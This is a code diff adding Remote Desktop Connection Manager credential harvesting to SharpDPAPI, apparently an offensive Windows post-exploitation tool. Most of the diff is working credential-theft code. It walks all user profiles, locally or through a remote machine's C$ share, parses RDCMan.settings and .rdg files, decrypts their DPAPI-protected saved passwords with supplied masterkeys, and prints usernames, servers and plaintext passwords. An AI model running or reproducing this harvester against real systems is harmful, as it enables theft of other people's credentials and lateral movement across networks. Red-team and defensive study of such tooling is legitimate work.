@@ -3,7 +3,9 @@ using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Text;
 using System.Text.RegularExpressions;
+using System.Xml;
 
 namespace SharpDPAPI
 {
@@ -28,7 +30,6 @@ namespace SharpDPAPI
             {
                 // if elevated, triage ALL reachable masterkeys
 
-                string systemFolder = "";
                 string userFolder = "";
 
                 if (!String.IsNullOrEmpty(computerName))
@@ -516,6 +517,274 @@ namespace SharpDPAPI
                 Console.WriteLine("[X] Error triaging {0} : {1}", credFilePath, e.Message);
             }
             Console.WriteLine();
+        }
+
+        public static void TriageRDCMan(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false)
+        {
+            // search for RDCMan.settings files, parsing any found with TriageRDCManFile()
+
+            if (!String.IsNullOrEmpty(computerName))
+            {
+                // if we're triaging a remote computer, check connectivity first
+                bool canAccess = Helpers.TestRemote(computerName);
+                if (!canAccess)
+                {
+                    return;
+                }
+            }
+
+            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
+            {
+                Console.WriteLine("[*] Triaging RDCMan.settings Files for ALL users\r\n");
+
+                string userFolder = "";
+                if (!String.IsNullOrEmpty(computerName))
+                {
+                    userFolder = String.Format("\\\\{0}\\C$\\Users\\", computerName);
+                }
+                else
+                {
+                    userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                }
+
+                string[] dirs = Directory.GetDirectories(userFolder);
+
+                foreach (string dir in dirs)
+                {
+                    string[] parts = dir.Split('\\');
+                    string userName = parts[parts.Length - 1];
+                    if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                    {
+                        string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", dir);
+                        TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("[*] Triaging RDCMan Settings Files for current user\r\n");
+                string userName = Environment.GetEnvironmentVariable("USERNAME");
+                string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
+            }
+        }
+
+        public static void TriageRDCManFile(Dictionary<string, string> MasterKeys, string rdcManFile, bool unprotect = false)
+        {
+            // triage a specific RDCMan.settings file
+
+            if (System.IO.File.Exists(rdcManFile))
+            {
+                DateTime lastAccessed = System.IO.File.GetLastAccessTime(rdcManFile);
+                DateTime lastModified = System.IO.File.GetLastWriteTime(rdcManFile);
+
+                XmlDocument xmlDoc = new XmlDocument();
+                xmlDoc.Load(rdcManFile);
+
+                Console.WriteLine("    RDCManFile    : {0}", rdcManFile);
+                Console.WriteLine("    Accessed      : {0}", lastAccessed);
+                Console.WriteLine("    Modified      : {0}", lastModified);
+
+
+                // show any recently used servers
+                XmlNodeList recentlyUsed = xmlDoc.GetElementsByTagName("recentlyUsed");
+                if (recentlyUsed[0]["server"] != null)
+                {
+                    string recentlyUsedServer = recentlyUsed[0]["server"].InnerText;
+                    Console.WriteLine("    Recent Server : {0}", recentlyUsedServer);
+                }
+
+
+                // see if there are any credential profiles
+                XmlNodeList credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");
+
+                if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
+                {
+                    Console.WriteLine("\r\n        Cred Profiles");
+                }
+                foreach (XmlNode credProfileNode in credProfileNodes)
+                {
+                    Console.WriteLine();
+                    DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
+                }
+
+
+                // check default logonCredentials stuff
+                XmlNodeList logonCredNodes = xmlDoc.GetElementsByTagName("logonCredentials");
+
+                if ((logonCredNodes != null) && (logonCredNodes.Count != 0))
+                {
+                    Console.WriteLine("\r\n        Default Logon Credentials");
+                }
+                foreach (XmlNode logonCredNode in logonCredNodes)
+                {
+                    Console.WriteLine();
+                    DisplayCredProfile(MasterKeys, logonCredNode, unprotect);
+                }
+
+
+                // grab the recent RDG files
+                XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
+                XmlNodeList items = filesToOpen[0].ChildNodes;
+                
+                // triage recently used RDG files                
+                foreach (XmlNode rdgFile in items)
+                {
+                    TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
+                }
+                Console.WriteLine();
+            }
+        }
+
+        public static void DisplayCredProfile(Dictionary<string, string> MasterKeys, XmlNode credProfileNode, bool unprotect = false)
+        {
+            // helper that displays a Credential Profile/Logon settings XML node from RDG/RDCMan.settings files
+
+            string profileName = credProfileNode["profileName"].InnerText;
+
+            if (credProfileNode["userName"] == null)
+            {
+                // have a profile name only
+                Console.WriteLine("          Cred Profile : {0}", profileName);
+            }
+            else {
+                string userName = credProfileNode["userName"].InnerText.Trim();
+                string domain = credProfileNode["domain"].InnerText.Trim();
+                string b64Password = credProfileNode["password"].InnerText;
+                string password = "";
+                string fullUserName = "";
+
+                if (String.IsNullOrEmpty(domain))
+                {
+                    fullUserName = userName;
+                }
+                else
+                {
+                    fullUserName = String.Format("{0}\\{1}", domain, userName);
+                }
+
+                Console.WriteLine("          Profile Name : {0}", profileName);
+                Console.WriteLine("            UserName   : {0}", fullUserName);
+
+                byte[] passwordDPAPIbytes = Convert.FromBase64String(b64Password);
+
+                if (passwordDPAPIbytes.Length > 0)
+                {
+                    byte[] decBytesRaw = Dpapi.DescribeDPAPIBlob(passwordDPAPIbytes, MasterKeys, "rdg", unprotect);
+
+                    if (decBytesRaw.Length != 0)
+                    {
+                        // chop off anything after the UNICODE end
+                        int finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
+                        if (finalIndex > 1)
+                        {
+                            byte[] decBytes = new byte[finalIndex + 1];
+                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
+                            password = Encoding.Unicode.GetString(decBytes);
+                        }
+                        else
+                        {
+                            password = Encoding.ASCII.GetString(decBytesRaw);
+                        }
+                    }
+                    Console.WriteLine("            Password   : {0}", password);
+                }
+            }
+        }
+
+        public static void TriageRDGFile(Dictionary<string, string> MasterKeys, string rdgFilePath, bool unprotect = false)
+        {
+            // parses a RDG connection file, decrypting any password blobs as appropriate
+
+            if (System.IO.File.Exists(rdgFilePath))
+            {
+                Console.WriteLine("\r\n      {0}", rdgFilePath);
+
+                XmlDocument xmlDoc = new XmlDocument();
+                xmlDoc.Load(rdgFilePath);
+
+                XmlNodeList credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");
+
+                if((credProfileNodes != null) && (credProfileNodes.Count != 0))
+                {
+                    Console.WriteLine("\r\n        Cred Profiles");
+                }
+                foreach (XmlNode credProfileNode in credProfileNodes)
+                {
+                    Console.WriteLine();
+                    DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
+                }
+
+                XmlNodeList servers = xmlDoc.GetElementsByTagName("server");
+
+                if ((servers != null) && (servers.Count != 0))
+                {
+                    Console.WriteLine("\r\n        Servers");
+                }
+
+                foreach (XmlNode server in servers)
+                {
+                    try
+                    {
+                        if((server["properties"]["name"] != null))
+                        {
+                            if(server["properties"]["displayName"] != null)
+                            {
+                                Console.WriteLine("\r\n          Name         : {0} ({1})", server["properties"]["name"].InnerText, server["properties"]["displayName"].InnerText);
+                            }
+                            else
+                            {
+                                Console.WriteLine("\r\n          Name         : {0}", server["properties"]["name"].InnerText);
+                            }
+
+                            if (server["logonCredentials"] != null)
+                            {
+                                DisplayCredProfile(MasterKeys, server["logonCredentials"], unprotect);
+                            }
+                        }
+                    }
+                    catch (Exception e) {
+                        Console.WriteLine("Exception: {0}", e);
+                    }
+                }
+            }
+        }
+
+        public static void TriageRDGFolder(Dictionary<string, string> MasterKeys, string folder, bool unprotect)
+        {
+            // triage a specific RDG folder
+
+            if (System.IO.Directory.Exists(folder))
+            {
+                string[] systemFiles = Directory.GetFiles(folder);
+                if ((systemFiles != null) && (systemFiles.Length != 0))
+                {
+                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);
+
+                    foreach (string file in systemFiles)
+                    {
+                        if (file.EndsWith(".rdg"))
+                        {
+                            try
+                            {
+                                TriageRDGFile(MasterKeys, file, unprotect);
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    // Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
+                }
+            }
+            else
+            {
+                // Console.WriteLine("\r\n[X] Folder '{0}' doesn't currently exist!", folder);
+            }
         }
     }
 }
